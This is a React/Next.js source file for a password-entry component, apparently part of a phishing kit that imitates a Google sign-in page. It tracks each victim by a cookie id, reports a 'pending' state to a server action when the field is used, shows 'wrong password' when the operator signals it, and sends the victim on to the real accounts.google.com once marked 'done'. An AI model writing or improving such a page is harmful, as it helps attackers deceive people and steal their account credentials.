"use client";
import { changeState } from "@/actions";
import Cookies from "js-cookie";
import { useSearchParams } from "next/navigation";
import { useEffect, useState } from "react";

export default function PasswordFill() {
  const [showPassword, setShowPassword] = useState(false);
  const [wrongPass, setWrongPass] = useState(false);
  const [id, setId] = useState(null);
  const searchParams = useSearchParams();
  useEffect(() => {
    setId(Cookies.get("dataId"));
    setWrongPass(searchParams.get("wrong"));
    if (searchParams.get("done")) {
      window.location.replace("https://accounts.google.com");
    }
  }, [searchParams]);
  return (
    <div>
      <div>
        <input
          onClick={async () => {
            await changeState(id, "pending");
            setWrongPass(false);
          }}
          name="password"
          className={`${
            wrongPass ? " border-red-600 " : ""
          } border w-full p-4 mt-10 bg-white rounded text-gray-700`}
          placeholder="Enter your password"
          type={showPassword ? "text" : "password"}
        />
        {wrongPass && <span className="text-red-600 mt-2">wrong password</span>}

        <input type="hidden" name="id" value={id} />
      </div>
      <div className="flex gap-3  items-center mt-5">
        <input
          id="showPassword"
          onChange={() => setShowPassword(!showPassword)}
          className="  form-checkbox h-5 w-5 appearance-none border-2   border-black bg-white checked:bg-blue-700 checked:border-blue-700"
          type="checkbox"
        />
        <label className="cursor-pointer select-none" htmlFor="showPassword">
          Show password
        </label>
      </div>
    </div>
  );
}
